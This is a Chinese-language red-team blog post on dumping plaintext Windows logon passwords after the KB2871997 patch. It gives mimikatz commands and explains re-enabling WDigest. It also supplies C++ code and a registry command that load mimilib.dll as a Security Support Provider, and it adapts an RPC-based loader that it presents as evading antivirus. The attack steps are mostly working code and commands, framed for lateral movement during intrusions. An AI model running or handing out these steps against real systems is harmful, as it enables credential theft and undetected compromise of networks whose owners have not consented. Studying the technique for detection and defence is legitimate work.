---
layout: post
title:  "Windows下获取本地用户明文密码的方法"
---  
## 0x00 前言
在内网渗透中，获取明文密码是红队常用的攻击手段之一，当拿到明文密码之后我们可以:

- 通过WMI、PsExec等去横向渗透
- 碰撞其他机器密码
- 生成一定规律的密码字典

但在实战中有时候我们无法获取到明文密码，大多是因为kb2871997的问题，那么接下来我们详细研究下kb2871997的原理以及该怎么去抓明文凭据。

## 0x01 kb2871997
有关kb2871997补丁的说明，参考:  
<https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/>  

文章中提到，kb2871997补丁主要针对Windows 7和Windows Server 2008 R2之后的系统，kb2871997主要解决了三个问题：

- 支持Protected Users组
- 远程桌面连接支持Restricted Admin模式
- 清除LSA凭证和一些其他变化

第一点主要增加了Protected User组，如果用户的帐号是该组的成员，那么用户必须使用Kerberos协议登录，并且Kerberos协议的加密方式不再是DES或RC4，强制使用AES加密，当用户加入Protected Users组之后，默认是抓不到hash，。   
第二点主要是增加了Restricted Admin模式。   
第三点中，明文凭据将不被存储，但是NT hash、TGT/Session key 还会被存储；
其次，添加了  
```SID's (LOCAL_ACCOUNT,LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP)```，
同时，还从lsass中删除了明文凭证，但不会删除WDigest,微软给出的建议是在注册表项:
***HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest***  
中的UseLogonCredential值设置为0。接下来，我们在不打补丁的本地实验环境下抓取密码。  
- 实验环境：Windows Server 2012  
- 工具：mimikatz  

在cmd中输入**systeminfo**查看补丁:<br>
![avatar](https://raw.githubusercontent.com/Fun0nydg/blogpic/main/2021-02-15/1-0.png)<br>

如图，未打补丁，直接使用mimikatz抓取:
```shell
privilege::debug
sekurlsa::logonPasswords full
```
如图，获取到了明文密码  <br>
![avatar](https://raw.githubusercontent.com/Fun0nydg/blogpic/main/2021-02-15/1-1.png)<br>

接下来我们安装kb2871997，安装之后，在cmd中输入**systeminfo**查看补丁：<br>
![avatar](https://raw.githubusercontent.com/Fun0nydg/blogpic/main/2021-02-15/1-2.png)<br>

如图，已经安装好补丁,添加UseLogonCredential值，并设置为0<br>
![avatar](https://raw.githubusercontent.com/Fun0nydg/blogpic/main/2021-02-15/1-3.png)<br>

继续使用mimikatz抓取,命令同上，如图:<br>
![avatar](https://raw.githubusercontent.com/Fun0nydg/blogpic/main/2021-02-15/1-5.png)<br>
我们可以看到，这时wdigest的明文也无法获取，我们只有hash。<br> 

## 0x02 抓取wdigest明文
由于注册表项:  
***HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest***中的UseLogonCredential值为0，我们不能直接抓到wdigest明文，但我们可以用管理员权限将其设置为1，待重启之后，管理员重新登录，我们再用mimikatz便可以抓到wdigest明文，但这种方法并不是很好，如果没有UseLogonCredential，我们需要在注册表中额外添加，并且还需要重启服务器或者计算机，条件要求过于苛刻，故不采用此方法。  

## 0x03 添加SSP获取明文凭据
### **1.什么是SSP**
参考：  
<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn751052(v=ws.11)>  

SSPI(Security Support Provider Interface),它是Windows身份验证的基础。那么SSP又是什么呢？文中这样说道
>The default Security Support Providers (SSPs) that invoke specific authentication protocols in Windows are incorporated into the SSPI as DLLs. These default SSPs are described in the following sections. Additional SSPs can be incorporated if they can operate with the SSPI.

也就是说SSP会调用特定的身份认证协议，它会作为DLL并入到SSPI中。简单的说，SSP可以作为DLL，并且跟Windows身份认证有关。  

### 2.添加SSP
#### 2.1调用AddSecurityPackage
刚才我们提到，SSP可以作为DLL,那么我们把mimikatz中的mimilib.dll作为SSP，便可以从lsass中提取明文。  
参考3gstudent的文章:  
<https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/>  
文中提到了三种方法加载SSP，方法一需要重新启动，于是我们便不采用该方法；方法二中调用了AddSecurityPackage，同时我参考了国外的文章：  
<https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package>  
这里我们用文中提到的代码进行编译，我修改了dll路径为 c:\\windows\\system32\\mimilib.dll
```cpp
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#pragma comment(lib, "Secur32.lib")

int main()
{
	SECURITY_PACKAGE_OPTIONS spo = {};
	SECURITY_STATUS ss = AddSecurityPackageA((LPSTR)"c:\\windows\\system32\\mimilib.dll", &spo);
	return 0;
}
```
在visual studio中编译好之后，我们还需要做两个准备工作：
- 将mimilib.dll复制到c:\windows\system32目录下
- 修改注册表项，在powershell中执行
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
```
完成以上两个步骤之后，运行编译好的程序，之后等到用户锁屏重新登录，我们便可以在c:\windows\system32\kiwissp.log中查看到明文密码:<br>
![avatar](https://raw.githubusercontent.com/Fun0nydg/blogpic/main/2021-02-15/1-6.png)<br>

这个方法的好处是不需要重启计算机便可以添加mimilib，但它并不是最好的方法，因为它需要修改注册表，SSP必须在lsass中注册，这样很容易被检测到。  

#### 2.2通过RPC调用添加SSP
在学习了国外大佬XPN的博客  
<https://blog.xpnsec.com/exploring-mimikatz-part-2/>  
发现用RPC去调用添加SSP会更好，整个过程有较少的敏感行为，可以规避杀软的检测，当然，添加的dll肯定不能用mimilib，我们需要自己生成一个，参考奇安信A-TEAM的文章:  
<https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#442-%E7%BB%95%E8%BF%87%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E6%8A%93lsass%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81>  

这里面已经给出了dump内存的dll代码，实战可以采用A-TEAM的dll，本文为了方便演示便继续使用mimilib.dll。  
首先，我们下载XPN大佬写好的代码:  
<https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e>   
我用的是visual studio 2019，下载好之后不能直接编译成功，我们需要修改下代码:
- 将sspi_c.c和AddSecurityPackage_RawRPC.c的后缀改为cpp
- 在sspi_h.h中添加:
```cpp
#pragma comment(lib, "Rpcrt4.lib")
```
- 将AddSecurityPackage_RawRPC.cpp中的
```cpp
unsigned char* pszStringBinding = NULL;
```

修改为

```cpp
RPC_WSTR pszStringBinding = NULL;
```

将

```cpp
status = RpcStringBindingCompose(NULL,
		(unsigned char*)"ncalrpc",
		NULL,
		(unsigned char*)"lsasspirpc",
		NULL,
		&pszStringBinding);
```

修改为

```cpp
status = RpcStringBindingCompose(NULL,
		(RPC_WSTR)L"ncalrpc",
		NULL,
		(RPC_WSTR)L"lsasspirpc",
		NULL,
		&pszStringBinding);
```

修改好后编译生成即可。放到我们的实验环境下，在cmd中运行:

```shell
xxx.exe C:\Users\Administrator\Desktop\mimilib.dll
```  

xxx.exe是我们刚刚生成用于添加SSP的exe，这里dll需要写绝对路径，如图，添加成功:<br>
![avatar](https://raw.githubusercontent.com/Fun0nydg/blogpic/main/2021-02-15/3-1.png)<br>

锁屏之后重新登录，我们发现在c:\windows\system32\kiwissp.log中记录了明文密码:<br>
![avatar](https://raw.githubusercontent.com/Fun0nydg/blogpic/main/2021-02-15/3-2.png)<br>

### 参考
- <https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/>
- <https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn751052(v=ws.11)>
- <https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/>
- <https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package/>
- <https://blog.xpnsec.com/exploring-mimikatz-part-2/>
- <https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#442-%E7%BB%95%E8%BF%87%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E6%8A%93lsass%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81>
- <https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e>
